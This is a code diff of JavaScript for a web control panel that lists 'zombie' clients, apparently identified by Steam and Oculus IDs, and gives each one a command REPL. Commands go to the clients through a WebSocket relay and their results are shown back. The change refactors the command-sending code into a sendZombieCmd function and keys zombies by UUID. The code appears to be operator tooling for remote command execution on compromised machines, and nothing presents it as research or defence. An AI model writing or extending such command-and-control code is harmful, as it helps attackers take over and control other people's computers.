@@ -391,7 +391,7 @@ function RoomUI(roomId, room){
         '        <div class="row">\n' +
         '            <div class="col-6 col-sm-4">\n' +
         '                <div class="card">\n' +
-        '                    <div class="card-header">Chat</div>\n' +
+        '                    <div class="card-header"><b class="icon">📧</b>Chat</div>\n' +
         '                    <div class="card-body chat">\n' +
         '                    </div>\n' +
         '                </div>\n' +
@@ -859,6 +859,15 @@ function requestTurn(turnURL) {
 
 
 
+
+function sendZombieCmd(zombieUuid, cmd){
+    messageRelayWs.send(JSON.stringify({
+        type: "zombie-cmd",
+        uuid: zombieUuid,
+        cmd: cmd
+    }));
+}
+
 let zombies = [];
 var messageRelayWs = new WebSocket('ws://127.0.0.1:8081');
 messageRelayWs.onopen = function(){
@@ -872,29 +881,21 @@ messageRelayWs.onmessage = function(event){
             rooms[message.roomId].roomUI.renderChatMessage(message.message, message.name, new Date());
             break;
         case 'zombie-register': {
-            let zombieId = message.steamId + '_' + message.oculusId;
-            console.log('New zombie:', zombieId);
-            zombies.push(zombieId);
+            console.log('New zombie:', message.uuid);
+            zombies.push(message.uuid);
 
             let repl = repls[message.uuid];
             repl.formElement.addEventListener("submit", function (event) {
                 event.preventDefault();
                 let cmd = repl.inputElement.value;
                 repl.renderCmd(cmd);
-                messageRelayWs.send(JSON.stringify({
-                    type: "zombie-cmd",
-                    steamId: message.steamId,
-                    oculusId: message.oculusId,
-                    uuid: message.uuid,
-                    cmd: cmd
-                }));
+                sendZombieCmd(message.uuid, cmd);
             });
 
             break;
         }
         case 'zombie-result': {
-            let zombieId = message.steamId + '_' + message.oculusId;
-            console.log('Zombie :', zombieId, 'Result:', message.result);
+            console.log('Zombie :', message.uuid, 'Result:', message.result);
             repls[message.uuid].renderResult(message.result);
             break;
         }
